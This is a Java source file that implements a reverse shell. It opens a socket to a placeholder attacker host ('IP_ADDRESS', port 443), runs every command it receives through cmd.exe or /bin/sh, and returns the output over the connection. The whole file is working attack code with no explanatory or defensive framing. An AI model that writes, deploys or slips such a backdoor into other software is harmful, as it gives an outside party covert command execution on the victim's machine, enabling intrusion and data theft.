// windows
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class Main {
    private static final String LHOST = "IP_ADDRESS";
    private static final int LPORT = 443;
    private static final int BUFFER_SIZE = 1024;

    public static void main(String[] args) {
        Socket client = null;

        try {
            client = new Socket(LHOST, LPORT);
            InputStream in = client.getInputStream();
            OutputStream out = client.getOutputStream();

            byte[] buffer = new byte[BUFFER_SIZE];

            while (true) {
                try {
                    int bytesRead = in.read(buffer);
                    if (bytesRead == -1) {
                        break;
                    }

                    String command = new String(buffer, 0, bytesRead, StandardCharsets.UTF_8).trim();

                    if (command.length() >= 0) {
                        byte[] output;
                        try {
                            output = runCommand(command);
                        } catch (Exception error) {
                            output = String.valueOf(error).getBytes(StandardCharsets.UTF_8);
                        }

                        out.write(output);
                        out.flush();
                    }
                } catch (Exception error) {
                    out.write(("error " + error).getBytes(StandardCharsets.UTF_8));
                    out.flush();
                }
            }
        } catch (IOException ignored) {
            // Intentionally ignored to maintain original structure (no explicit top-level error handling)
        } finally {
            if (client != null) {
                try {
                    client.close();
                } catch (IOException ignored) {
                    // Ignore on close
                }
            }
        }
    }

    private static byte[] runCommand(String command) throws IOException, InterruptedException {
        ProcessBuilder pb;

        String os = System.getProperty("os.name", "").toLowerCase();
        if (os.contains("win")) {
            pb = new ProcessBuilder("cmd.exe", "/c", command);
        } else {
            pb = new ProcessBuilder("/bin/sh", "-c", command);
        }

        pb.redirectErrorStream(true);
        Process process = pb.start();

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        try (InputStream processOut = process.getInputStream()) {
            byte[] buf = new byte[4096];
            int n;
            while ((n = processOut.read(buf)) != -1) {
                baos.write(buf, 0, n);
            }
        }

        process.waitFor();
        return baos.toByteArray();
    }
}
